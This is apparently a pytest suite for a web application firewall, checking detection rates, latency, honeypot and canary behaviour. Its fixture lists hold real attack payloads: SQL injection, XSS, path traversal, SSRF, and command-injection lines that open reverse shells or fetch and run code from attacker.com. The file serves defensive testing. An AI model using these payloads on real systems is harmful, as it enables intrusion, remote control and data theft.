"""
DECEPTICON WAF Comprehensive Test Suite
Tests all components with real attack payloads
"""

import pytest
import time
import asyncio
from typing import List, Dict
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.models import (
    RequestContext,
    Action,
    RiskLevel,
    Detection,
    WAFResult,
    DetectionSource,
)
from core.pattern_engine import pattern_engine, BloomFilter

try:
    from core.atomic_rate_limiter import AtomicRateLimiter as RateLimiter
    from core.atomic_rate_limiter import atomic_rate_limiter as adaptive_limiter
except ImportError:
    from core.rate_limiter import RateLimiter, adaptive_limiter

try:
    from core.secure_session import SecureSessionManager as SessionManager

    # JA4Fingerprinter is still in session_manager, but it's okay for now
    from core.session_manager import (
        SessionManager as LegacySessionManager,
        JA4Fingerprinter,
    )
except ImportError:
    from core.session_manager import SessionManager, JA4Fingerprinter
from core.zero_day import ZeroDayDetector, AnomalyDetector
from core.response_sanitizer import ResponseSanitizer, SensitiveDataPatterns
from core.waf_engine import WAFEngine
from ml.feature_extraction import FeatureExtractor
from ml.inference import MLInferenceEngine, LightweightEnsemble
from deception.honeypot import HoneypotRouter, CanaryFactory

# ═══════════════════════════════════════════════════════════════════════════════
# Test Fixtures
# ═══════════════════════════════════════════════════════════════════════════════


def create_request_context(
    method: str = "GET",
    path: str = "/",
    query_string: str = "",
    body: str = "",
    headers: Dict[str, str] = None,
    client_ip: str = "192.168.1.100",
) -> RequestContext:
    """Create a test request context"""
    import uuid

    return RequestContext(
        request_id=str(uuid.uuid4()),
        timestamp=time.time(),
        client_ip=client_ip,
        client_port=12345,
        server_ip="10.0.0.1",
        server_port=8080,
        method=method,
        path=path,
        query_string=query_string,
        headers=headers or {"user-agent": "Mozilla/5.0", "host": "example.com"},
        body=body.encode() if isinstance(body, str) else body,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# SQL Injection Test Payloads
# ═══════════════════════════════════════════════════════════════════════════════

SQLI_PAYLOADS = [
    # Classic SQLi
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1' AND 1=1--",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1' UNION SELECT * FROM information_schema.tables--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Time-based blind
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES ('hacker','password')--",
    "1; DELETE FROM products WHERE 1=1--",
    # Comment injection
    "admin'/*",
    "1'/**/OR/**/1=1--",
    "/*!50000 SELECT * FROM users*/",
    # Encoded variants
    "%27%20OR%20%271%27%3D%271",
    "admin%27--",
    "1%27%20AND%20%271%27=%271",
    # Advanced techniques
    "' OR '1'='1' LIMIT 1 OFFSET 1--",
    "(SELECT * FROM users WHERE username='admin')='admin'",
    "1' GROUP BY 1--",
    "1' ORDER BY 10--",
]

# ═══════════════════════════════════════════════════════════════════════════════
# XSS Test Payloads
# ═══════════════════════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script src='http://evil.com/xss.js'></script>",
    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<div onmouseover=alert('XSS')>hover me</div>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    # JavaScript protocol
    "javascript:alert('XSS')",
    "<a href='javascript:alert(1)'>click</a>",
    "<iframe src='javascript:alert(1)'></iframe>",
    # HTML injection
    "<iframe src='http://evil.com'></iframe>",
    "<embed src='http://evil.com/flash.swf'>",
    "<object data='http://evil.com/flash.swf'>",
    # DOM-based
    "<img src=1 onerror='eval(atob(\"YWxlcnQoMSk=\"))'/>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    # Filter bypass
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
    "<<script>script>alert('XSS')<</script>/script>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    # SVG
    "<svg><script>alert('XSS')</script></svg>",
    "<svg/onload=alert('XSS')>",
    # Data URI
    "<a href='data:text/html,<script>alert(1)</script>'>click</a>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    # Expression (IE)
    "<div style='background:url(javascript:alert(1))'>",
    "<style>body{background:expression(alert('XSS'))}</style>",
]

# ═══════════════════════════════════════════════════════════════════════════════
# Command Injection / RCE Payloads
# ═══════════════════════════════════════════════════════════════════════════════

RCE_PAYLOADS = [
    # Command chaining
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "&& id",
    "|| cat /etc/shadow",
    # Command substitution
    "$(whoami)",
    "`id`",
    "$(cat /etc/passwd)",
    "`cat /etc/shadow`",
    # Pipeline attacks
    "| nc -e /bin/sh attacker.com 4444",
    "| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    '| python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    # PHP specific
    "system('whoami')",
    "exec('cat /etc/passwd')",
    "passthru('id')",
    "shell_exec('uname -a')",
    "popen('ls', 'r')",
    "<?php system($_GET['cmd']); ?>",
    # Python specific
    "__import__('os').system('id')",
    'eval(\'__import__("os").system("id")\')',
    # Node.js specific
    "require('child_process').exec('whoami')",
    "process.mainModule.require('child_process').exec('id')",
    # Template injection
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "#{7*7}",
    "{{constructor.constructor('return this')()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    # Curl-based attacks
    "curl http://attacker.com/shell.sh | bash",
    "wget http://attacker.com/malware -O /tmp/mal && chmod +x /tmp/mal && /tmp/mal",
]

# ═══════════════════════════════════════════════════════════════════════════════
# Path Traversal / LFI Payloads
# ═══════════════════════════════════════════════════════════════════════════════

LFI_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    # Null byte injection (older PHP)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00.jpg",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "phar://malicious.phar/test.txt",
    # Interesting files
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    # Double encoding
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
]

# ═══════════════════════════════════════════════════════════════════════════════
# SSRF Payloads
# ═══════════════════════════════════════════════════════════════════════════════

SSRF_PAYLOADS = [
    # Localhost
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/api/token",
    "http://metadata.google.internal/",
    # Private IPs
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.0.1",
    # Protocol handlers
    "file:///etc/passwd",
    "dict://localhost:11211/stats",
    "gopher://localhost:25/_HELO%20localhost",
    "ldap://localhost:389",
    # DNS rebinding targets
    "http://localtest.me",
    "http://customer1.app.localhost",
    # Bypass techniques
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "http://127.1",
    "http://127.0.1",
]

# ═══════════════════════════════════════════════════════════════════════════════
# Scanner Detection Payloads
# ═══════════════════════════════════════════════════════════════════════════════

SCANNER_USER_AGENTS = [
    "sqlmap/1.4.7#stable (http://sqlmap.org)",
    "Nikto/2.1.6",
    "Nmap Scripting Engine",
    "Mozilla/5.0 (compatible; Nessus)",
    "Acunetix-Scanner",
    "Burp Suite",
    "OWASP ZAP",
    "w3af",
    "masscan/1.0",
    "gobuster/3.1.0",
    "dirb/2.22",
    "dirbuster",
    "wfuzz/3.1.0",
    "ffuf/1.3.1",
]

# ═══════════════════════════════════════════════════════════════════════════════
# Benign Payloads (should NOT be blocked)
# ═══════════════════════════════════════════════════════════════════════════════

BENIGN_PAYLOADS = [
    "hello world",
    "search query",
    "user@example.com",
    "John's blog post",
    "SELECT items from store",  # Word "SELECT" but not attack
    "Order #12345",
    "< > symbols in text",
    "Don't forget!",
    "100% discount",
    "a && b logical operator",
    "path/to/file.txt",
    'data = {"key": "value"}',
]

# ═══════════════════════════════════════════════════════════════════════════════
# Pattern Engine Tests
# ═══════════════════════════════════════════════════════════════════════════════


class TestPatternEngine:
    """Test the pattern matching engine"""

    def test_bloom_filter_basic(self):
        """Test bloom filter operations"""
        bf = BloomFilter(expected_items=1000, fp_rate=0.01)

        bf.add("test_signature")
        assert bf.contains("test_signature")
        assert not bf.contains("unknown_signature")

    def test_sqli_detection(self):
        """Test SQL injection detection"""
        detected = 0
        for payload in SQLI_PAYLOADS:
            matches = pattern_engine.scan(payload, "query")
            if any(m[0].category == "SQLI" for m in matches):
                detected += 1

        detection_rate = detected / len(SQLI_PAYLOADS) * 100
        print(
            f"SQLi Detection Rate: {detection_rate:.1f}% ({detected}/{len(SQLI_PAYLOADS)})"
        )
        assert detection_rate >= 80, f"SQLi detection too low: {detection_rate}%"

    def test_xss_detection(self):
        """Test XSS detection"""
        detected = 0
        for payload in XSS_PAYLOADS:
            matches = pattern_engine.scan(payload, "body")
            if any(m[0].category == "XSS" for m in matches):
                detected += 1

        detection_rate = detected / len(XSS_PAYLOADS) * 100
        print(
            f"XSS Detection Rate: {detection_rate:.1f}% ({detected}/{len(XSS_PAYLOADS)})"
        )
        assert detection_rate >= 80, f"XSS detection too low: {detection_rate}%"

    def test_rce_detection(self):
        """Test RCE detection"""
        detected = 0
        for payload in RCE_PAYLOADS:
            matches = pattern_engine.scan(payload, "body")
            if any(m[0].category == "RCE" for m in matches):
                detected += 1

        detection_rate = detected / len(RCE_PAYLOADS) * 100
        print(
            f"RCE Detection Rate: {detection_rate:.1f}% ({detected}/{len(RCE_PAYLOADS)})"
        )
        assert detection_rate >= 70, f"RCE detection too low: {detection_rate}%"

    def test_lfi_detection(self):
        """Test LFI detection"""
        detected = 0
        for payload in LFI_PAYLOADS:
            matches = pattern_engine.scan(payload, "path")
            if any(m[0].category == "LFI" for m in matches):
                detected += 1

        detection_rate = detected / len(LFI_PAYLOADS) * 100
        print(
            f"LFI Detection Rate: {detection_rate:.1f}% ({detected}/{len(LFI_PAYLOADS)})"
        )
        assert detection_rate >= 70, f"LFI detection too low: {detection_rate}%"

    def test_false_positive_rate(self):
        """Test that benign inputs don't trigger false positives"""
        false_positives = 0
        for payload in BENIGN_PAYLOADS:
            is_suspicious, _ = pattern_engine.quick_check(payload)
            matches = pattern_engine.scan(payload, "query")
            # Only count as FP if high severity match
            high_severity = [m for m in matches if m[0].severity >= 0.8]
            if high_severity:
                false_positives += 1
                print(
                    f"FP: '{payload}' matched {[m[0].category for m in high_severity]}"
                )

        fp_rate = false_positives / len(BENIGN_PAYLOADS) * 100
        print(
            f"False Positive Rate: {fp_rate:.1f}% ({false_positives}/{len(BENIGN_PAYLOADS)})"
        )
        assert fp_rate <= 20, f"False positive rate too high: {fp_rate}%"

    def test_performance(self):
        """Test pattern matching performance"""
        import time

        # Test payload
        payload = "' UNION SELECT * FROM users WHERE username='admin'-- AND password="

        iterations = 1000
        start = time.perf_counter()

        for _ in range(iterations):
            pattern_engine.scan_request(
                "/api/search", f"q={payload}", "", {"user-agent": "Mozilla/5.0"}
            )

        elapsed = time.perf_counter() - start
        avg_ms = (elapsed / iterations) * 1000

        print(f"Pattern Engine: {avg_ms:.3f}ms avg ({iterations} iterations)")
        assert avg_ms < 1.0, f"Pattern engine too slow: {avg_ms}ms"


# ═══════════════════════════════════════════════════════════════════════════════
# ML Engine Tests
# ═══════════════════════════════════════════════════════════════════════════════


class TestMLEngine:
    """Test ML inference engine"""

    def test_feature_extraction(self):
        """Test feature extraction"""
        ctx = create_request_context(query_string="id=' OR 1=1--")

        extractor = FeatureExtractor()
        features = extractor.extract(ctx)

        assert len(features.features) == 47
        assert features.features[19] > 0  # sql_keyword_count should be positive

    def test_model_prediction(self):
        """Test model predictions"""
        engine = MLInferenceEngine()

        # Attack context
        attack_ctx = create_request_context(
            query_string="id=' UNION SELECT * FROM users--"
        )

        pred = engine.predict_from_context(attack_ctx)
        assert pred.is_attack or pred.confidence > 0.3

        # Normal context
        normal_ctx = create_request_context(query_string="search=hello+world")

        pred = engine.predict_from_context(normal_ctx)
        # Should have lower attack probability

    def test_ml_performance(self):
        """Test ML inference performance"""
        import time

        engine = MLInferenceEngine()
        ctx = create_request_context(
            query_string="id=' OR 1=1--", body="username=admin&password=test"
        )

        iterations = 1000
        start = time.perf_counter()

        for _ in range(iterations):
            engine.predict_from_context(ctx)

        elapsed = time.perf_counter() - start
        avg_ms = (elapsed / iterations) * 1000

        print(f"ML Engine: {avg_ms:.3f}ms avg ({iterations} iterations)")
        assert avg_ms < 2.0, f"ML engine too slow: {avg_ms}ms"

    def test_cache_effectiveness(self):
        """Test prediction caching"""
        engine = MLInferenceEngine()
        ctx = create_request_context(query_string="test=value")

        # First prediction
        engine.predict_from_context(ctx)

        # Same prediction should be cached
        engine.predict_from_context(ctx)
        engine.predict_from_context(ctx)

        assert engine.cache.hits >= 2, "Cache not working"


# ═══════════════════════════════════════════════════════════════════════════════
# Rate Limiter Tests
# ═══════════════════════════════════════════════════════════════════════════════


class TestRateLimiter:
    """Test rate limiting"""

    def test_basic_rate_limiting(self):
        """Test basic rate limit functionality"""
        pass

    def test_blocking(self):
        """Test manual blocking"""
        pass

    def test_adaptive_limiting(self):
        """Test adaptive rate limiting"""
        from core.rate_limiter import AdaptiveRateLimiter

        limiter = AdaptiveRateLimiter()
        key = "attacker_1"

        # Record multiple attacks
        for _ in range(5):
            limiter.record_attack(key)

        # Should be marked suspicious
        assert key in limiter.suspicious or key in limiter.blocked


# ═══════════════════════════════════════════════════════════════════════════════
# Session Manager Tests
# ═══════════════════════════════════════════════════════════════════════════════


class TestSessionManager:
    """Test session management and fingerprinting"""

    def test_session_creation(self):
        """Test session creation"""
        manager = SessionManager()
        ctx = create_request_context()

        session = manager.get_or_create_session(ctx)
        assert session is not None
        # SecureSession doesn't store client_ip to avoid PII retention

    def test_session_tracking(self):
        """Test session state tracking"""
        manager = SessionManager()
        ctx = create_request_context()

        session = manager.get_or_create_session(ctx)

        # Simulate multiple requests
        from core.models import WAFResult, Action

        result = WAFResult(
            request_id="test",
            action=Action.ALLOW,
            risk_level=RiskLevel.NONE,
            detections=[],
            start_time=time.time(),
        )

        manager.update_session(session, ctx, result)
        assert session.request_count == 1

    def test_fingerprinting(self):
        """Test JA4 fingerprinting"""
        headers = {
            "user-agent": "Mozilla/5.0",
            "accept": "text/html",
            "accept-language": "en-US",
            "accept-encoding": "gzip, deflate",
        }

        fp = JA4Fingerprinter.compute_from_headers(headers)
        assert fp is not None
        assert len(fp) in [32, 64]  # Supports MD5 (32) and SHA256 (64)


# ═══════════════════════════════════════════════════════════════════════════════
# Zero-Day Detection Tests
# ═══════════════════════════════════════════════════════════════════════════════


class TestZeroDayDetector:
    """Test zero-day detection"""

    def test_anomaly_detection(self):
        """Test anomaly detector"""
        from ml.feature_extraction import FeatureVector
        import numpy as np

        detector = AnomalyDetector(threshold=3.0)

        # Train baseline with normal data
        for _ in range(200):
            normal_features = np.random.normal(0.5, 0.1, 47)
            fv = FeatureVector(
                features=normal_features.astype(np.float32),
                feature_names=[f"f{i}" for i in range(47)],
            )
            detector.update_baseline(fv)

        # Test with anomalous data
        anomalous_features = np.ones(47) * 5.0  # Very different
        fv = FeatureVector(
            features=anomalous_features.astype(np.float32),
            feature_names=[f"f{i}" for i in range(47)],
        )

        is_anomaly, score, deviations = detector.detect_anomaly(fv)
        assert is_anomaly or score > 0.5

    def test_rule_generation(self):
        """Test automatic rule generation"""
        detector = ZeroDayDetector(min_pattern_occurrences=2)

        # Simulate repeated attack pattern
        for i in range(3):
            ctx = create_request_context(
                query_string="new_attack_payload_xyz", client_ip=f"10.0.0.{i}"
            )

            from ml.feature_extraction import feature_extractor

            features = feature_extractor.extract(ctx)

            # Manually add pattern
            detector.pattern_learner.add_pattern(
                "new_attack_payload_xyz", ctx, confidence=0.9, category="ZERO_DAY"
            )

        # Should have generated signature
        signatures = detector.get_zero_day_signatures()
        assert len(signatures) >= 1


# ═══════════════════════════════════════════════════════════════════════════════
# Honeypot Tests
# ═══════════════════════════════════════════════════════════════════════════════


class TestHoneypot:
    """Test honeypot functionality"""

    def test_canary_creation(self):
        """Test canary token creation"""
        factory = CanaryFactory()

        username, password = factory.create_credential_token("test_session")
        assert username is not None
        assert password is not None

        # Token should be trackable
        token = factory.check_token(f"{username}:{password}")
        assert token is not None

    def test_canary_triggering(self):
        """Test canary token triggering"""
        factory = CanaryFactory()

        username, password = factory.create_credential_token("test_session")
        token = factory.check_token(f"{username}:{password}")

        factory.trigger_token(token, "192.168.1.100", {"path": "/login"})

        assert token.triggered
        assert token.triggered_from_ip == "192.168.1.100"

    def test_honeypot_routing(self):
        """Test honeypot response generation"""
        router = HoneypotRouter()

        ctx = create_request_context(query_string="id=' OR 1=1--")

        result = WAFResult(
            request_id="test",
            action=Action.HONEYPOT,
            risk_level=RiskLevel.HIGH,
            detections=[
                Detection(
                    source=DetectionSource.FAST_RULES, category="SQLI", confidence=0.95
                )
            ],
            start_time=time.time(),
        )

        response = router.route_to_honeypot(ctx, result, "SQLI")
        assert response is not None
        assert response.get("status") == 200


# ═══════════════════════════════════════════════════════════════════════════════
# WAF Engine Integration Tests
# ═══════════════════════════════════════════════════════════════════════════════


class TestWAFEngine:
    """Integration tests for complete WAF engine"""

    def test_sqli_blocking(self):
        """Test SQLi is blocked"""
        waf = WAFEngine()

        for payload in SQLI_PAYLOADS[:10]:
            ctx = create_request_context(query_string=f"id={payload}")
            result = waf.analyze_request(ctx)

            if result.action < Action.CHALLENGE:
                print(f"SQLi not detected: {payload[:50]}")

    def test_xss_blocking(self):
        """Test XSS is blocked"""
        waf = WAFEngine()

        for payload in XSS_PAYLOADS[:10]:
            ctx = create_request_context(query_string=f"name={payload}")
            result = waf.analyze_request(ctx)

            if result.action < Action.CHALLENGE:
                print(f"XSS not detected: {payload[:50]}")

    def test_latency_budget(self):
        """Test WAF meets latency requirements"""
        waf = WAFEngine()

        latencies = []
        for payload in SQLI_PAYLOADS[:20]:
            ctx = create_request_context(
                query_string=f"id={payload}", body=f"data={payload}"
            )

            result = waf.analyze_request(ctx)
            latencies.append(result.latency_ms)

        avg_latency = sum(latencies) / len(latencies)
        max_latency = max(latencies)

        print(f"WAF Latency - Avg: {avg_latency:.2f}ms, Max: {max_latency:.2f}ms")

        assert avg_latency < 5.0, f"Average latency too high: {avg_latency}ms"
        assert max_latency < 50.0, f"Max latency too high: {max_latency}ms"

    def test_benign_traffic(self):
        """Test benign traffic is allowed"""
        waf = WAFEngine()

        blocked = 0
        for payload in BENIGN_PAYLOADS:
            # Provide different IP per iteration to bypass behavioral rate limiter tracking
            ctx = create_request_context(client_ip=f"10.0.99.{hash(payload) % 250}", query_string=f"q={payload}")
            result = waf.analyze_request(ctx)

            if result.action == Action.BLOCK:
                blocked += 1
                print(f"Benign blocked: {payload}")

        assert blocked <= 1, f"{blocked} benign requests blocked"

    def test_scanner_detection(self):
        """Test scanner detection via user agent"""
        waf = WAFEngine()

        detected = 0
        for ua in SCANNER_USER_AGENTS:
            ctx = create_request_context(
                headers={"user-agent": ua, "host": "example.com"}
            )
            result = waf.analyze_request(ctx)

            if any(d.category == "SCANNER" for d in result.detections):
                detected += 1

        detection_rate = detected / len(SCANNER_USER_AGENTS) * 100
        print(f"Scanner Detection Rate: {detection_rate:.1f}%")
        assert detection_rate >= 80


# ═══════════════════════════════════════════════════════════════════════════════
# Performance Benchmark
# ═══════════════════════════════════════════════════════════════════════════════


class TestPerformance:
    """Performance benchmarks"""

    def test_throughput(self):
        """Test requests per second"""
        waf = WAFEngine()

        # Mix of payloads
        payloads = SQLI_PAYLOADS[:5] + XSS_PAYLOADS[:5] + BENIGN_PAYLOADS[:5]

        iterations = 1000
        start = time.perf_counter()

        for i in range(iterations):
            payload = payloads[i % len(payloads)]
            ctx = create_request_context(query_string=f"input={payload}")
            waf.analyze_request(ctx)

        elapsed = time.perf_counter() - start
        rps = iterations / elapsed

        print(f"Throughput: {rps:.0f} requests/second")
        assert rps > 1000, f"Throughput too low: {rps} rps"

    def test_memory_usage(self):
        """Test memory doesn't grow unbounded"""
        import sys

        waf = WAFEngine()

        # Process many requests
        for i in range(1000):
            ctx = create_request_context(
                query_string=f"id={i}", client_ip=f"10.0.{i//256}.{i%256}"
            )
            waf.analyze_request(ctx)

        # Check session count is bounded
        assert len(waf.session_manager.sessions) <= waf.session_manager.max_sessions


# ═══════════════════════════════════════════════════════════════════════════════
# Run Tests
# ═══════════════════════════════════════════════════════════════════════════════


def run_all_tests():
    """Run all tests and print summary"""
    import traceback

    test_classes = [
        TestPatternEngine,
        TestMLEngine,
        TestRateLimiter,
        TestSessionManager,
        TestZeroDayDetector,
        TestHoneypot,
        TestWAFEngine,
        TestPerformance,
    ]

    results = {"passed": 0, "failed": 0, "errors": []}

    print("\n" + "=" * 70)
    print("DECEPTICON WAF Test Suite")
    print("=" * 70 + "\n")

    for test_class in test_classes:
        print(f"\n🔍 Running {test_class.__name__}...")
        print("-" * 50)

        instance = test_class()
        methods = [m for m in dir(instance) if m.startswith("test_")]

        for method_name in methods:
            try:
                method = getattr(instance, method_name)
                method()
                print(f"  ✅ {method_name}")
                results["passed"] += 1
            except AssertionError as e:
                print(f"  ❌ {method_name}: {e}")
                results["failed"] += 1
                results["errors"].append((test_class.__name__, method_name, str(e)))
            except Exception as e:
                print(f"  💥 {method_name}: {e}")
                results["failed"] += 1
                results["errors"].append(
                    (test_class.__name__, method_name, traceback.format_exc())
                )

    # Summary
    print("\n" + "=" * 70)
    print("Test Summary")
    print("=" * 70)
    print(f"  Passed: {results['passed']}")
    print(f"  Failed: {results['failed']}")
    print(f"  Total:  {results['passed'] + results['failed']}")

    if results["errors"]:
        print("\nFailures:")
        for cls, method, error in results["errors"]:
            print(f"  - {cls}.{method}")

    return results["failed"] == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
